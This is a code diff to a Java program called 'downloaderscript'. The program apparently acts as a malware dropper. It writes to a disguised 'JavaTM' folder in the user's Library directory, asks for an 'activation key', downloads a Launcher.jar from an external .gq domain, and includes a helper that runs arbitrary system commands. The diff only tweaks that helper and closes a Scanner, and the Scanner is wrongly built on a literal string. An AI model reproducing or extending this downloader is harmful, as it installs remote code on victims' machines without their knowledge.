@@ -30,8 +30,8 @@ public class downloaderscript {
 		fos.close();
 		rbc.close();
 	}
-	public static void runcommand(String command) throws IOException{
-		Process process=Runtime.getRuntime().exec(command);
+	private static void runcommand(String command) throws IOException{
+		Runtime.getRuntime().exec(command);
 	}
 	public static void main(String[] args) {
 		dir=System.getProperty("user.home") + "/Library/ApplicationSupport/JavaTM/";
@@ -44,6 +44,7 @@ public class downloaderscript {
 				Scanner input=new Scanner("System.in");
 				System.out.println("Input Activation Key:");
 				inputkey=input.nextLine();
+				input.close();
 				String url = "http://totallymath.gq/UNM/dataInf.php?key="+inputkey;
 				downloadUsingNIO(url, dir+"Launcher.jar");
 				downloadUsingStream(url, dir+"Launcher.jar");
